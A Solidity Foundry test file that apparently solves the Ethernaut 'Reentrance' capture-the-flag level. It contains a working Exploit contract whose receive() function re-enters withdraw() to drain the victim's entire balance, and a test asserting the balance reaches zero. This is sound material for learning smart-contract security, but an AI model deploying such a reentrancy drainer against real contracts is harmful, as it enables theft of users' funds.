// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Reentrance.sol";
import "src/levels/ReentranceFactory.sol";

contract Exploit {
    Reentrance private victim;
    address public owner;

    constructor(Reentrance _victim) public {
        owner = msg.sender;
        victim = _victim;
    }

    function cashOut() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success);
    }

    function exploit() public payable {
        victim.donate{value: msg.value}(address(this));

        victim.withdraw(msg.value);
    }

    receive() external payable {
        uint256 victimBalance = address(victim).balance;
        if (victimBalance > 0) {
            uint256 withdrawAmount = msg.value;
            if (withdrawAmount > victimBalance) {
                withdrawAmount = victimBalance;
            }
            victim.withdraw(withdrawAmount);
        }
    }
}

contract TestReentrance is BaseTest {
    Reentrance private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ReentranceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */
        uint256 insertCoin = ReentranceFactory(payable(address(levelFactory))).insertCoin();
        levelAddress = payable(this.createLevelInstance{value: insertCoin}(true));
        level = Reentrance(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */
        vm.startPrank(player);

        uint256 playerBalance = player.balance;
        uint256 levelBalance = address(level).balance;

        Exploit exploiter = new Exploit(level);

        exploiter.exploit{value: levelBalance / 2}();

        exploiter.cashOut();

        assertEq(address(level).balance, 0);

        vm.stopPrank();
    }
}
